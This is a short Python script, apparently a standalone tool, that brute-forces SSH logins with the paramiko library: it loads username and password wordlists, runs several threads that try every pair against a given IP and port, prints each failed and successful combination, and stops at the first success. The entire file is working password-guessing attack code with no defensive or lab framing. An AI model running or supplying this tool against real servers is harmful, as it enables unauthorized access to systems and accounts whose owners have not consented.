import getopt
import sys
from threading import Thread

import os
import paramiko

IP = ""
USERNAME = []
USERNAME_COUNT = 0
PASSWORD = []
PASSWORD_COUNT = 0
PORT = 22
THREAD_COUNT = 3

username_index = 0
password_index = 0

def main():
    global USERNAME, PASSWORD, THREAD_COUNT, PORT, IP, PASSWORD_COUNT, USERNAME_COUNT
    options = sys.argv[1:]
    opts, _ = getopt.getopt(options, "i:L:P:t:s:", ["ip=", "list=", "password=", "thread=", "port="])

    for k, v in opts:
        if k == "-i" or k == "--ip":
            IP = v
        elif k == "-L" or k == "--list":
            USERNAME = read_file(v)
            USERNAME_COUNT = len(USERNAME)
        elif k == "-P" or k == "--password":
            PASSWORD = read_file(v)
            PASSWORD_COUNT = len(PASSWORD)
        elif k == "-t" or k == "--thread":
            THREAD_COUNT = int(v)
        elif k == "-s" or k == "--port":
            PORT = v
    
    process()

def process():
    threads = []
    for _ in range(THREAD_COUNT):
        t = Thread(target=ssh_thread)
        t.start()
        threads.append(t)
    
    for t in threads:
        t.join()

def ssh_thread():
    global password_index, username_index

    while (username_index < USERNAME_COUNT):
        while (password_index < PASSWORD_COUNT):
            if username_index >= USERNAME_COUNT:
                break

            passwd = PASSWORD[password_index]
            usrname = USERNAME[username_index]
            password_index = password_index + 1

            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                client.connect(IP, username=usrname, password=passwd, port=PORT)
            except:
                print(f"{usrname}, {passwd} failed")
                client.close()
            else:
                print(f"{usrname}, {passwd} success")
                client.close()
                os._exit(1)

        username_index = username_index + 1
        password_index = 0

def read_file(file_name):
    f = open(file_name, "r")
    words = f.readlines()
    words = list(map(strip, words))

    f.close()
    
    return words

def strip(word):
    return word.strip()

if __name__ == "__main__":
    main()